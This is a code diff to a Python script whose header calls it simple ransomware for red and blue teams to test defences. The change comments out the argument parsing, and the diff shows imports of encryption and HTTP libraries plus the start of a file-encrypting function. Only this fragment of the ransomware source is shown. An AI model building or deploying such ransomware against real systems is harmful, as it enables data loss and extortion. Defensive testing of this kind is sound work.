@@ -2,7 +2,7 @@
 # Simple Ransomware for blue/red teams to test their defenses against ransomwares. Purely for Educational purposes.
 # Author not responsible for any damage caused by using this tool.
 #!/usr/bin/python3
-import argparse
+# import argparse
 import os
 import base64
 import pyAesCrypt
@@ -13,11 +13,11 @@ import requests
 import pgpy
 from Cryptodome.Cipher import AES
 from Cryptodome.Random import get_random_bytes
-parser = argparse.ArgumentParser()
-parser.add_argument("--dir",help="Location of the Folder you want to simulate")
-parser.add_argument("--mode",help="Accepts encrypt or decrypt arguments.")
-parser.add_argument("--password",help="Password to use for encryption/decryption.")
-args = parser.parse_args()
+# parser = argparse.ArgumentParser()
+# parser.add_argument("--dir",help="Location of the Folder you want to simulate")
+# parser.add_argument("--mode",help="Accepts encrypt or decrypt arguments.")
+# parser.add_argument("--password",help="Password to use for encryption/decryption.")
+# args = parser.parse_args()
 def EncryptFile(file,password):
     bufferSize = 64 * 1024
     pyAesCrypt.encryptFile(file, file+".pyran", password, bufferSize)
